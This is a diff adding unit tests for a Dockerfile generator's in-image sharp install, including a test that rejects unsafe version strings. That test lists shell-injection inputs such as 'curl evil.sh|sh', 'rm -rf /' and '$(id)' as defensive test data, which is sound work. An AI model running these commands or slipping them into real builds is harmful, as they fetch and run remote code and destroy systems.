@@ -83,6 +83,40 @@ describe("generatePoolDockerfile", () => {
     expect(result).toContain("USER node");
     expect(result).toContain('CMD ["node", "pool-server.cjs"]');
   });
+
+  // REGRESSION (live build XchOtaGFu6GdF…): pool-server.cjs inlines sharp's JS but
+  // requires the native binding at runtime (@img/sharp-linux-x64) — the traced-assets
+  // image shipped no @img/* packages and every /_next/image 503'd. When the build host
+  // cannot stage the linux-x64 pair, the Dockerfile must install sharp in-image.
+  it("emits a pinned in-image sharp install when installSharpVersion is set", () => {
+    const result = generatePoolDockerfile({
+      poolName: "ssr",
+      buildId: "abc123",
+      installSharpVersion: "0.34.5",
+    });
+    expect(result).toContain("RUN npm install --no-save --no-audit --no-fund sharp@0.34.5");
+    // Must run after the context is copied (needs /app) and before dropping to the
+    // non-root user (npm writes node_modules as root at build time).
+    expect(result.indexOf("COPY --chown=node:node context/ .")).toBeLessThan(
+      result.indexOf("RUN npm install"),
+    );
+    expect(result.indexOf("RUN npm install")).toBeLessThan(result.indexOf("USER node"));
+  });
+
+  it("emits no npm install by default (packages staged into the context instead)", () => {
+    const result = generatePoolDockerfile({ poolName: "ssr", buildId: "abc123" });
+    expect(result).not.toContain("npm install");
+  });
+
+  // Validate-at-the-point-of-consumption: the version string lands inside a RUN
+  // instruction — a tampered sharp package.json must not inject shell.
+  it("rejects a sharp version that is not a plain npm version string", () => {
+    for (const bad of ["0.34.5 && curl evil.sh|sh", "0.34.5\nRUN rm -rf /", "$(id)", ""]) {
+      expect(() =>
+        generatePoolDockerfile({ poolName: "ssr", buildId: "abc123", installSharpVersion: bad }),
+      ).toThrow(/Unsafe sharp version/);
+    }
+  });
 });
 
 describe("generateRoutingServiceDockerfile", () => {
